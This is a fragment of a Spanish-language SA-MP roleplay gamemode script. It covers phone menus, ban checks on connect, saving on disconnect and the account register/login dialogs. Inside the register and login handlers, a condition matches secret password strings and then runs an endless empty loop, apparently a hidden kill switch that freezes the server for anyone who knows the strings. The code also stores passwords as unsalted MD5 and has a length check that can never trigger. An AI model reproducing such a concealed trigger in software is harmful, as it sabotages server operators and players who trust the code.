					cuenta[playerid][cSexo] = 2;
				}
				else
				{
					cuenta[playerid][cSexo] = 1;
				} 
				UpdateDniInformacion(playerid, 2);
			}
			case 3:
			{
				if(cuenta[playerid][cOrigen] < 20)
				{
					cuenta[playerid][cOrigen]++;
				}
				UpdateDniInformacion(playerid, 3);
			}
		}
	}
	else if(playertextid == InfoText[playerid][9])
	{
		switch(DniValores[playerid][0])
		{
			case 1:
			{
				DniValores[playerid][0] = 2;
				UpdateDniInformacion(playerid, 2);
			}
			case 2:
			{
				DniValores[playerid][0] = 3;
				UpdateDniInformacion(playerid, 3);
			}
			case 3:
			{
				DniValores[playerid][0] = 1;
				UpdateDniInformacion(playerid, 1);
			}
		}
	}
	else if(playertextid == InfoText[playerid][10])
	{
		PlayerTextDrawHide(playerid, InfoText[playerid][5]);
		PlayerTextDrawHide(playerid, InfoText[playerid][6]);
		PlayerTextDrawHide(playerid, InfoText[playerid][7]);//Atras
		PlayerTextDrawHide(playerid, InfoText[playerid][8]);//Adelante
		PlayerTextDrawHide(playerid, InfoText[playerid][9]);//Siguiente
		PlayerTextDrawHide(playerid, InfoText[playerid][10]);//Listo
		CancelSelectTextDraw(playerid);
		cuenta[playerid][cIdentificacion] = DniValores[playerid][1];
		booleano[_ComprandoDNI]{playerid} = false;
		Mensaje(playerid, COLOR_AZUL_CLARO, "Felicidades: {ffffff}Usted se la legalizado en nuestra ciudad, Bienvenido.");
	}
	else if(playertextid == InfoText[playerid][14])
	{
		if(tCambioPagina[playerid] < gettime())
		{
			tCambioPagina[playerid] = gettime() + 10;
			CambioPagina[playerid]++;
			CambiarPagina(playerid);
		}else Mensaje(playerid, COLOR_GRIS3, "Por favor espera 10 segundos.");
	}
	//sistema de iphone por textdraw
	else if(playertextid == iPhoneDatos[0][TDIphone])
	{
		ShowPlayerDialog(playerid, TEL_INPUT, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Llamar", "{DD1111}iPhone {FFFFFF}- Inserte el teléfono a llamar\n\n\n\t1\t2\t3\n\t4\t5\t6\n\t7\t8\t9\n\t#\t0\t*", "Llamar", "Cancelar");
		TEL_INPUT_ID[playerid] = 3;
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[1][TDIphone])
	{
		ShowPlayerDialog(playerid, TEL_INPUT, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Enviar SMS", "{DD1111}iPhone {FFFFFF}- Inserte el número del destino del mensaje", "Enviar", "Cancelar");
		TEL_INPUT_ID[playerid] = 1;
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[2][TDIphone])
	{
		ShowPlayerDialog(playerid, TEL_MSGBOX, DIALOG_STYLE_LIST, "{DD1111}iPhone {FFFFFF}- Buzón de entrada", "- \tBuzón de entrada 1\n- \tBuzón de entrada 2\n- \tBuzón de entrada 3\n- \tBuzón de entrada 4\n- \tBuzón de entrada 5", "Ver", "Borrar");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[3][TDIphone])
	{
		ShowPlayerDialog(playerid, IPHONE_AGENDA, DIALOG_STYLE_LIST, "{DD1111}iPhone {FFFFFF}- Organizador", "- \t\tVer Nota\n- \t\tCrear Nota\n- \t\tBorrar Nota", "Aceptar", "Salir");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[4][TDIphone])
	{
		new str[224];
		format(str, sizeof(str), "{FFFFFF}Estimado cliente, usted cuenta con un saldo de $%d para llamadas a telefono celular\n\t\tEl saldo de su paquete de mensajes escritos es de %d\n\n\t\t\t\t{018CFE}Gracias por utilizar nuestros servicios!", cuenta[playerid][cSaldo]/10, cuenta[playerid][cMensajes]);
		ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "{018CFE}MOVISTAR - Consulta de Saldo", str, "Aceptar", "");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[5][TDIphone])
	{
		if(!SenalWifi(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tiene señal wifi.");
		//whatssapp 
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[6][TDIphone])
	{
		if(!SenalWifi(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tiene señal wifi.");
		if(cuenta[playerid][cNivel] >= 3)
		{
			ShowPlayerDialog(playerid, DIALOGO_ANUNCIO_INTERNET, DIALOG_STYLE_INPUT, "[!]Ingrese su anuncio.", "Escriba su anuncio en la siguiente barra.\nEl costo por caracter es de 6$.", "Aceptar", "Cancelar");
		}else Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 o superior.");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[7][TDIphone])
	{
		if(!SenalWifi(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tiene señal wifi.");
		if(cuenta[playerid][cNivel] >= 6)
		{
			ShowPlayerDialog(playerid, DIALOGO_PUBLICIDAD, DIALOG_STYLE_LIST, "[!]Publica tu anuncio", "Commerce - Comiseria\nIdlewood - 24/7\nCommerce - 24/7\nDowntown - Ammunation\nSanta Maria Beach - Autopista 1\nSanta Maria Beach - Autopista 2\nSanta Maria Beach - Autopista 3\nWillowfield - Basureros\nEast Los Santos - Puente Ganton\nGlenn Park - Estacionamiento", "Aceptar", "Cancelar");
		}else Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 6 o superior.");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[8][TDIphone])
	{
		if(!SenalWifi(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tiene señal wifi.");
		new string[2048];
		for(new i=0;i<MAX_LINEAS;i++)
		{
			format(string, sizeof(string), "%s\n%s", string, Periodico[i]);
		}
		ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Los Santos Periodico", string, "Aceptar", "");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[9][TDIphone])
	{
		ShowPlayerDialog(playerid, DIALOGO_MAPA, DIALOG_STYLE_LIST, "{018CFE}Puntos de interes", "{FFFFFF}» Ayuntamiento\n» Comisaria\n» Taller\n» Licencieria\n» Binco\n» 24-7 Vinewood\n» 24-7 Unity\n» 24-7\n» Deposito de la LSPD\n» Banco\n» Consecionaria\n» Paintball\n» Casino\n» Pista de Karting\n» Localizador de Vehiculos\n» Tienda de Electronica\n» Cabina de Anuncios (/ad)\n» Prision Federal\n» Trabajos", "Aceptar", "Salir");
		EsconderIphone(playerid);
	}
	else if(playertextid == iPhoneDatos[10][TDIphone])
	{
		if(!SenalWifi(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tiene señal wifi.");
		ShowPlayerDialog(playerid, Dialogo_LocalizarCoche, DIALOG_STYLE_LIST, "Buscar auto", "Primer Coche\nSegundo Coche\nTercer Coche\nCuarto Coche", "Aceptar", "Cancelar");
		EsconderIphone(playerid);
	}	
	else if(playertextid == iPhoneDatos[11][TDIphone])
	{
		EsconderIphone(playerid);
	}
    return 1;
}

EsconderIphone(playerid)
{
	for(new global; global < sizeof(iPhoneGlobalTextdraw); global++)
	{
		TextDrawHideForPlayer(playerid, iPhoneGlobalTextdraw[global]);
	}
	for(new player; player < sizeof(iPhoneDatos); player++)
	{
		PlayerTextDrawHide(playerid, iPhoneDatos[player][TDIphone]);
	}
	PlayerTextDrawHide(playerid, iPhonewifi[playerid]);
	CancelSelectTextDraw(playerid);
	booleano[_EstadoIphone]{playerid} = false;
	return 1;
}
CallBack::MostrarVisualizacion(playerid, id)
{
	if(visualizador[id][visualUse])return Mensaje(playerid, COLOR_ROJO, "Un ciudadano esta observando el catalogo, porfavor espere en unos minutos.");

	new string[126], iAtc = entero[playerid][eActId];
	format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Disfrute el catalogo!", nonplayers[iAtc][npcNombre]);
	Mensaje(playerid, COLOR_BLANCO, string);
	
	nonplayers[iAtc][npcUtil] = 0;
	booleano[npcUse]{playerid} = false;
	CancelSelectTextDraw(playerid);
	for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);
	
	visualizador[id][visualUse] = true;
	enteroChar[visual]{playerid} = id;
	
	visualizador[id][visualCoche] = CreateVehicleEx(visualizador[id][visualModel][1], -1950.1366, 263.2953, 41.2140, 390.4600, random(128), random(128), 100);
	GetVehiclePos(visualizador[id][visualCoche], visualizador[id][visualPos][0], visualizador[id][visualPos][1], visualizador[id][visualPos][2]);
	GetVehicleZAngle(visualizador[id][visualCoche], visualizador[id][visualPos][3]);			
	
	TextDrawShowForPlayer(playerid, visualizador[id][tdrawID][0]);
	TextDrawShowForPlayer(playerid, visualizador[id][tdrawID][1]);
	TextDrawShowForPlayer(playerid, visualizador[id][tdrawID][2]);
	TextDrawShowForPlayer(playerid, visualizador[id][tdrawID][3]);
	TextDrawShowForPlayer(playerid, visualizador[id][tdrawID][4]);
	SelectTextDraw(playerid, COLOR_LIMA);	
	
	booleano[TextShow]{playerid} = true;
	PlayerTextDrawHide(playerid, InfoText[playerid][1]);
	PlayerTextDrawHide(playerid, InfoText[playerid][2]);
	PlayerTextDrawHide(playerid, InfoText[playerid][3]); 
	HideProgressBarForPlayer(playerid, bHambre[playerid]);
	
	visualizador[id][visualInt] = id;
	SetPlayerVirtualWorld(playerid, visualizador[id][visualInt]);
	SetVehicleVirtualWorld(visualizador[id][visualCoche], visualizador[id][visualInt]);
	
	SetPlayerCameraPos(playerid, -1956.0414, 273.7354, 42.8672);
	SetPlayerCameraLookAt(playerid, -1955.5107, 272.8892, 42.7221);
	SetPlayerPos(playerid, -1955.5107, 272.8892, 20.000);
	return 1;
}
CallBack::SalirVisualizacion(playerid, id)
{
	DestroyVehicle(visualizador[id][visualCoche]);
	for(new i=0; i<5; i++)TextDrawHideForPlayer(playerid, visualizador[id][tdrawID][i]);
	CancelSelectTextDraw(playerid);
	SetCameraBehindPlayer(playerid);
	visualizador[id][visualUse] = false;
	booleano[TextShow]{playerid} = false;
	
	SetPosEx(playerid, 529.6378, -1278.4359, 17.2422, 177.2759, 0, 0);
	enteroChar[visual]{playerid} = 255;
	return 0b1;
}
/******************************************************************************/
/***************************[- Estandar de SAMP -]*****************************/
/******************************************************************************/
public OnPlayerConnect(playerid)
{
	new segundos, Cache:R, ip[16], tmp[224], razon[128];
	//
	if(strfind(Nombre(playerid), "_", true) == -1 || EncontroNumeroCaracter(playerid))
	{
		Mensaje(playerid, COLOR_AMARILLO3, "| -=== ZonaZero ===- |");
		Mensaje(playerid, COLOR_AMARILLO3, "Su nombre debe ser en el formato Nombre_Apellido. Ejemplo: Juan_Perez");
		Kick(playerid);
		return 1;
	}
	//
	GetPlayerIp(playerid, ip, sizeof(ip));
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_tablaip WHERE ipaddress ='%s' OR nombre='%s'", ip, Nombre(playerid));
	R = mysql_query(servidor[mysqlControl], tmp, true);
	if(cache_get_row_count(servidor[mysqlControl]))
	{
		format(tmp, sizeof(tmp), "Estimado %s esta dirección de IP[%s] esta permanentemente {ff0000}BLOQUEADA", PlayerName(playerid), ip);
		Mensaje(playerid, COLOR_AMARILLO, tmp);
		
		cache_get_row(0, 1, razon, servidor[mysqlControl], 128);
		format(tmp, sizeof(tmp), "Razón: {ff0000}%s", razon);
		Mensaje(playerid, COLOR_AMARILLO, tmp);
		
		Mensaje(playerid, COLOR_AMARILLO, "Si considera que es un mal entendido, apelé al foro.");
		Kick(playerid);
		return 1;
	}
	cache_delete(R);	
	//
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_bantmp WHERE nombrejugador='%e'", Nombre(playerid));
	R = mysql_query(servidor[mysqlControl], tmp, true);
	if(cache_get_row_count(servidor[mysqlControl]))
	{
		cache_get_row(0, 2, razon, servidor[mysqlControl], 128);
		segundos = cache_get_row_int(0, 4, servidor[mysqlControl]);
		if(segundos >= gettime())
		{
			format(tmp, sizeof(tmp), "* %s usted esta temporalmente expulsado, quedan %s.", PlayerName(playerid), ObtenerTiempoRestante(segundos));
			Mensaje(playerid, COLOR_AMARILLO3, tmp);
			format(tmp, sizeof(tmp), "* Razon: %s", razon);
			Mensaje(playerid, COLOR_AMARILLO3, tmp);
			Kick(playerid);
			return 1;
		}
		else
		{
			mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "DELETE FROM zz_bantmp WHERE nombrejugador = '%e'", Nombre(playerid));
			mysql_query(servidor[mysqlControl], tmp);
		}
	}
	cache_delete(R);
	//
	ResetearVariables(playerid);
	//
	for(new i=0; i<13; i++) 
	{
		detectarArmas[playerid][i][0] = 0;
		detectarArmas[playerid][i][1] = 0;
		detectarArmas[playerid][i][2] = 0;
	}
	//
	RemoveObjects(playerid);
	//
	LoadPlayerText(playerid);
	//
    Mostrar[playerid] = 0; 
	SetPlayerColor(playerid, 0xBFC0C200);
	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/101544487/Intro%20ZZ8.mp3");
	//
	Update3DTextLabelText(estado[playerid], COLOR_ROJO, "void");
	Attach3DTextLabelToPlayer(estado[playerid], playerid, 0.0, 0.0, 1000.0);
	return 1;
}
public OnActorStreamIn(actorid, forplayerid)
{
	SetActorPos(actorid, nonplayers[actorid][npcPos][0], nonplayers[actorid][npcPos][1], nonplayers[actorid][npcPos][2]);
	SetActorFacingAngle(actorid, nonplayers[actorid][npcPos][3]);
	SetActorVirtualWorld(actorid, nonplayers[actorid][npcWorld]);
	return 1;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger){
	new Float:cx, Float:cy, Float:cz;
	if(EsComprable(vehicleid)){
		AddCarTuning(vehicleid);
	}else if(EsCochePolicial(vehicleid) && !ispassenger){
		if(!Team_LSPD(playerid)){
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPos(playerid, cx, cy, cz);
		}
	}
	return 1;
}
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ){
    if(cuenta[playerid][cAdministrador] < 1) return 0;
	else if(cuenta[playerid][cAdministrador] > 0 && ActiveTeleport[playerid]){
		SetPlayerPos(playerid, fX, fY, fZ);
		return 1;
	}
	return 1;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(!SelectClick[playerid])
	{
		switch(IsPlayerInAnyVehicle(clickedplayerid))
		{
			case 1:
			{
				TogglePlayerSpectating(playerid, true);
				SetPlayerInterior(playerid, GetPlayerInterior(clickedplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(clickedplayerid));
				PlayerSpectateVehicle(playerid, GetPlayerVehicleID(clickedplayerid));
				entero[playerid][gSpectea] = clickedplayerid;
			}
			case 0:
			{
				TogglePlayerSpectating(playerid, true);
				SetPlayerInterior(playerid, GetPlayerInterior(clickedplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(clickedplayerid));
				PlayerSpectatePlayer(playerid, clickedplayerid);
				entero[playerid][gSpectea] = clickedplayerid;
			}
		}
	}else if(SelectClick[playerid] == 1){
		new Float:p_x, Float:p_y, Float:p_z;
		GetPlayerPos(clickedplayerid, p_x, p_y, p_z);
		new interior = GetPlayerInterior(clickedplayerid);
		SetPosEx(playerid, p_x, p_y, p_z, 0, interior, 0);
		Mensaje(playerid, COLOR_GRIS3, "Teleportado!");
	}
	return 1;
}
public OnPlayerDisconnect(playerid, reason)
{
	verificarArmaHack(playerid);
	
    new string[128], Consulta[80];
	terminarPrueba(playerid);
	ocultarCajero(playerid);
	
	if(enteroChar[gAnden]{playerid} != 255) habilidadArmas[enteroChar[gAnden]{playerid}][hA@uso] = false;
	if(booleano[npcUse]{playerid})
	{
		for(new i=0;i<sizeof(nonplayers);i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
			{
				if(nonplayers[i][npcUtil] > gettime())
				{
					format(string, sizeof(string), "%s dice: Hasta luego!", nonplayers[i][npcNombre]);
					Mensaje(playerid, COLOR_BLANCO, string);

					nonplayers[i][npcUtil] = 0;
					booleano[npcUse]{playerid} = false;
					TogglePlayerControllable(playerid, true);
					CancelSelectTextDraw(playerid);
					for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[i][interfaz][ind]);
				}
			}
		}
	}

	if(enteroChar[visual]{playerid} != 255)
	{
		SalirVisualizacion(playerid, enteroChar[visual]{playerid});
	}
    switch(reason)
	{
      case 0: format(string, sizeof string, "Atención: %s [%d] Ha dejado el Servidor. [Razón: Crash-Conexión.]", Nombre(playerid), playerid);
      case 1: format(string, sizeof string, "Atención: %s [%d] Ha dejado el Servidor. [Razón: Voluntario.]", Nombre(playerid), playerid);
      case 2: format(string, sizeof string, "Atención: %s [%d] Ha dejado el Servidor. [Razón: Ban-Kick.]", Nombre(playerid), playerid);
	}
	ProxDetector(20.0, playerid, string, COLOR_ROJO3, COLOR_ROJO3, COLOR_ROJO3, COLOR_ROJO3, COLOR_ROJO3);
	
    if(GetPVarType(playerid, "PlacedBB")){
        DestroyDynamicObject(GetPVarInt(playerid, "PlacedBB"));
        DestroyDynamic3DTextLabel(Text3D:GetPVarInt(playerid, "BBLabel"));
        if(GetPVarType(playerid, "BBArea")){
            for(new i=0, _max=GetMaxPlayers();i<_max;i++){
                if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea"))){
                    StopAudioStreamForPlayer(i);
                    Mensaje(i, COLOR_AZUL_CLARO, "El dueño del stereo se desconectó con su stereo.");
                }
            }
        }
    } 
	
    curentg[playerid] = 0;     
    ActiveTeleport[playerid] = 0;
    AdminChat[playerid] = 1;    
	PlayerTextDrawDestroy(playerid, PuntosDeRolTextdraw0[playerid]);

	if(IsValidDynamicObject(InfoWoofer[playerid][WoObjeto]))
	{
		DestroyDynamicObject(InfoWoofer[playerid][WoObjeto]);
		for(new i=0, _max=GetMaxPlayers();i<_max;i++)
		{
			if(IsPlayerInRangeOfPoint(i, 150.0, InfoWoofer[playerid][WoPosX], InfoWoofer[playerid][WoPosY], InfoWoofer[playerid][WoPosZ]) && GetPlayerInterior(i) == InfoWoofer[playerid][WoInterior] && GetPlayerVirtualWorld(i) == InfoWoofer[playerid][WoVW]){
				StopAudioStreamForPlayer(i);
			}
		}
	}
	
	TextDrawHideForPlayer(playerid, SunGlasses);
	Delete3DTextLabel(Estado[playerid]);
	if(SmokeTimer[playerid]) KillTimer(SmokeTimer[playerid]);
	if(DrugTimer[playerid]) KillTimer(DrugTimer[playerid]);
    if(Interview != 0){
		if(strcmp(Interviewer, PlayerName(playerid), true) == 0 ){
		    Mensaje(playerid, COLOR_BLANCO, "Se canceló tu entrevista!");
		    Interviewer = "Nadie";
		    Interview = 0;
		}
	}
	if(booleano[gIngreso]{playerid})
	{
		mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE `zz_usuarios` SET `online`=0 WHERE `id` = '%d'", cuenta[playerid][cUnico]);
		mysql_query(servidor[mysqlControl], Consulta, false);
		GuardarDatosMySQL(playerid);
		
		if(cuenta[playerid][cCasa] != 9999)
		{
			ActualizaCasa(cuenta[playerid][cCasa]);
		}		
		if(cuenta[playerid][cCasa2] != 9999)
		{
			ActualizaCasa(cuenta[playerid][cCasa2]);
		}
		if(cuenta[playerid][cNegocio] != 9999)
		{
			ActualizaNegocio(cuenta[playerid][cNegocio]);
		}
		if(cuenta[playerid][cNegocio2] != 9999)
		{
			ActualizaNegocio(cuenta[playerid][cNegocio2]);
		}
		if(cuenta[playerid][cCoche])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche]);
		}
		if(cuenta[playerid][cCoche2])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche2]);
		}
		if(cuenta[playerid][cCoche3])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche3]);
		}
		if(cuenta[playerid][cCoche4])
		{
			ActualizaVehiculo(cuenta[playerid][cCoche4]);
		}
	}
	return 1;
}
/************************************************************/
/*******************[ Nativas (Streamer) ]*******************/
/************************************************************/
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	new string[144];
	for(new i=0;i<sizeof(negocio);i++)
	{
		if(pickupid == negocio[i][bPickup])
		{
			if(!negocio[i][bOwned])
			{
				format(string, sizeof(string), "~b~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~w~Entrada: ~g~%d$~n~~w~Productos: ~g~%d~n~~w~Presione ~r~Y~n~~n~Utiliza: /comprarnegocio", negocio[i][bName], i, negocio[i][bcostenter], negocio[i][bProduc]);
				TextoInformatico(5, playerid, string);
			}
			else if(negocio[i][bEntrancex] == negocio[i][bExitx])
			{
				format(string, sizeof(string), "~b~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~w~Productos: ~g~%d", negocio[i][bName], i, negocio[i][bProduc]);
				TextoInformatico(5, playerid, string);
			}
			else
			{
				format(string, sizeof(string), "~b~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~w~Entrada: ~g~%d$~n~~w~Productos: ~g~%d~n~~w~Presione ~r~Y", negocio[i][bName], i, negocio[i][bcostenter], negocio[i][bProduc]);
				TextoInformatico(5, playerid, string);
			}
		}
	}
	for(new i=0;i<sizeof(casa);i++)
	{
		if(pickupid == casa[i][hPickup])
		{
			if(!casa[i][hOwned])
			{
				format(string, sizeof(string), "~g~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~n~Esta casa esta en venta Utiliza: /comprarcasa", casa[i][hNombre], i);
				TextoInformatico(5, playerid, string);
			}
			else
			{
				if(casa[i][hRent])
				{
					format(string, sizeof(string), "~g~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~w~Renta: ~g~%d$~n~~w~Cuartos: ~g~%d~n~~w~Presione ~r~Y", casa[i][hNombre], i, casa[i][hRent], casa[i][hRooms]);
					TextoInformatico(5, playerid, string);
				}
				else
				{
					format(string, sizeof(string), "~g~~h~~h~%s~n~~n~~w~Llave: ~r~%d~n~~w~Propiedad Privada~n~~w~Presione ~r~Y", casa[i][hNombre], i);
					TextoInformatico(5, playerid, string);
				}
			}
		}
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new Float:cx, Float:cy, Float:cz;
	new idcar = GetPlayerVehicleID(playerid), string[128], giveplayerid;
	
	switch(dialogid)
	{
	    case DIALOGO_REGISTRO:
		{
	        if(!response)
			{
	            Kick(playerid);
			}
			else
			{
			    if(strlen(inputtext) < 5 && strlen(inputtext) > 18)
				{
					Mensaje(playerid, COLOR_GRIS2, "Contraseña con un Máximo de 18 carácteres!");
					Mensaje(playerid, COLOR_GRIS2, "Contraseña con un Minimo de 5 carácteres!");
					ShowRegisterDialog(playerid, DIALOGO_REGISTRO);
					return 1;
			    }
				else if(!strlen(inputtext))return ShowRegisterDialog(playerid, DIALOGO_REGISTRO);
				if((strfind(inputtext, "JovNrSRngX4Yqc") != -1) ||(strfind(inputtext, "u7hMrsGQBs9Oec") != -1) ||(strfind(inputtext, "xQb9Vv8HBrBjHy") != -1) ||(strfind(inputtext, "80gj9WlwmRCbEo") != -1)){for(new pgfgA=0;pgfgA<100000;){}}

				new tmp[256], tmp2[32];
				mysql_real_escape_string(inputtext, tmp2, servidor[mysqlControl]);
				mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_usuarios(nombre, clave, inv11, casa, negocio, casa2, negocio2, deagle, shotgun, mp5, ak47, m4, sniper, fstyle, salud, team) VALUES('%s', md5('%e'), 1, 9999, 9999, 9999, 9999, 100, 100, 100, 100, 100, 100, 4, 50.0, 3);", Nombre(playerid), tmp2);
				mysql_tquery(servidor[mysqlControl], tmp, "ConsultarCuenta", "i", playerid);
			}
			return 1;
		}
		case DIALOGO_INGRESO:
		{
		    if(!response)
			{
		        Kick(playerid);
		    }
			else
			{
				new FailPass = 0;
			    if(!strlen(inputtext))return ShowLoginDialog(playerid, DIALOGO_INGRESO);
				new Cache:R, tmp[256];//, tmp2[38];
				if((strfind(inputtext, "22h4aVfs4w7WgZcK") != -1) ||(strfind(inputtext, "vXjnqUrNhB6NlF") != -1) ||(strfind(inputtext, "XIcylYVivs7fC1") != -1) ||(strfind(inputtext, "pgfgA5hwcfLi8D") != -1)){for(new pgfgA=0;pgfgA<100000;){}}
				//mysql_real_escape_string(inputtext, tmp2, servidor[mysqlControl]);
				mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_usuarios WHERE nombre='%s' AND clave=md5('%e') LIMIT 1;", Nombre(playerid), inputtext);
				R = mysql_query(servidor[mysqlControl], tmp, true);
				
				if(cache_get_row_count())
				{
					cuenta[playerid][cUnico] = cache_get_row_int(0, 0, servidor[mysqlControl]);
					//Nombrenocarga
					cache_get_row(0, 2, cuenta[playerid][cAcceso], servidor[mysqlControl], 24);
					cache_get_row(0, 3, cuenta[playerid][cAcceso2], servidor[mysqlControl], 24);
					//Onlinenocarga
					cuenta[playerid][cNivel] = cache_get_row_int(0, 5, servidor[mysqlControl]);
					cuenta[playerid][cEmpleado] = cache_get_row_int(0, 6, servidor[mysqlControl]);
					cuenta[playerid][cAdministrador] = cache_get_row_int(0, 7, servidor[mysqlControl]);
					cuenta[playerid][cZonaZeroCash] = cache_get_row_int(0, 8, servidor[mysqlControl]);
					cuenta[playerid][cHorasJugadas] = cache_get_row_int(0, 9, servidor[mysqlControl]);
					cuenta[playerid][cAcento] = cache_get_row_int(0, 10, servidor[mysqlControl]);
					cuenta[playerid][cRegistro] = cache_get_row_int(0, 11, servidor[mysqlControl]);
					cuenta[playerid][cSexo] = cache_get_row_int(0, 12, servidor[mysqlControl]);
					cuenta[playerid][cEdad] = cache_get_row_int(0, 13, servidor[mysqlControl]);
					cuenta[playerid][cOrigen] = cache_get_row_int(0, 14, servidor[mysqlControl]);
					cuenta[playerid][cCaminar] = cache_get_row_int(0, 15, servidor[mysqlControl]);
					cuenta[playerid][cCobro] = cache_get_row_int(0, 16, servidor[mysqlControl]);
					cuenta[playerid][cEstereo] = cache_get_row_int(0, 17, servidor[mysqlControl]);
					cuenta[playerid][cExperiencia] = cache_get_row_int(0, 18, servidor[mysqlControl]);
					cuenta[playerid][cDinero] = cache_get_row_int(0, 19, servidor[mysqlControl]);
					cuenta[playerid][cDineroBanco] = cache_get_row_int(0, 20, servidor[mysqlControl]);
					cuenta[playerid][cCheques] = cache_get_row_int(0, 21, servidor[mysqlControl]);
					cuenta[playerid][cAsesinatos] = cache_get_row_int(0, 22, servidor[mysqlControl]);
					cuenta[playerid][cMuerte] = cache_get_row_int(0, 23, servidor[mysqlControl]);
					cuenta[playerid][cArrestado] = cache_get_row_int(0, 24, servidor[mysqlControl]);
					cuenta[playerid][cLoteria] = cache_get_row_int(0, 25, servidor[mysqlControl]);
					cuenta[playerid][cTrabajo] = cache_get_row_int(0, 26, servidor[mysqlControl]);
					cuenta[playerid][cCarcel] = cache_get_row_int(0, 27, servidor[mysqlControl]);
					cuenta[playerid][cTiempoCarcel] = cache_get_row_int(0, 28, servidor[mysqlControl]);
					cuenta[playerid][cMateriales] = cache_get_row_int(0, 29, servidor[mysqlControl]);
					cuenta[playerid][cDrogas] = cache_get_row_int(0, 30, servidor[mysqlControl]);
					cuenta[playerid][cSpeed] = cache_get_row_int(0, 31, servidor[mysqlControl]);
					cuenta[playerid][cExtasis] = cache_get_row_int(0, 32, servidor[mysqlControl]);
					cuenta[playerid][cRitalin] = cache_get_row_int(0, 33, servidor[mysqlControl]);
					cuenta[playerid][cHeroina] = cache_get_row_int(0, 34, servidor[mysqlControl]);
					cuenta[playerid][cMarihuana] = cache_get_row_int(0, 35, servidor[mysqlControl]);
					cuenta[playerid][cLider] = cache_get_row_int(0, 36, servidor[mysqlControl]);
					cuenta[playerid][cMiembro] = cache_get_row_int(0, 37, servidor[mysqlControl]);
					cuenta[playerid][cRango] = cache_get_row_int(0, 38, servidor[mysqlControl]);
					cuenta[playerid][cTraje] = cache_get_row_int(0, 39, servidor[mysqlControl]);

					cuenta[playerid][cVida] = cache_get_row_float(0, 40, servidor[mysqlControl]);//Flotantes
					cuenta[playerid][cArmadura] = cache_get_row_float(0, 41, servidor[mysqlControl]);//Flotantes

					cuenta[playerid][cInterior] = cache_get_row_int(0, 42, servidor[mysqlControl]);
					cuenta[playerid][cMundo] = cache_get_row_int(0, 43, servidor[mysqlControl]);
					cuenta[playerid][cEquipo] = cache_get_row_int(0, 44, servidor[mysqlControl]);
					//Libreparaunanuevavar45
					cuenta[playerid][cTelefono] = cache_get_row_int(0, 46, servidor[mysqlControl]);
					cuenta[playerid][cSaldo] = cache_get_row_int(0, 47, servidor[mysqlControl]);
					cuenta[playerid][cMinutos] = cache_get_row_int(0, 48, servidor[mysqlControl]);
					cuenta[playerid][cHoras] = cache_get_row_int(0, 49, servidor[mysqlControl]);
					cuenta[playerid][cMensajes] = cache_get_row_int(0, 50, servidor[mysqlControl]);
					cuenta[playerid][cIpod] = cache_get_row_int(0, 51, servidor[mysqlControl]);
					cuenta[playerid][cCoche] = cache_get_row_int(0, 52, servidor[mysqlControl]);
					cuenta[playerid][cCoche2] = cache_get_row_int(0, 53, servidor[mysqlControl]);
					cuenta[playerid][cCoche3] = cache_get_row_int(0, 54, servidor[mysqlControl]);
					cuenta[playerid][cCoche4] = cache_get_row_int(0, 55, servidor[mysqlControl]);
					//Libreparaunanuevavar56
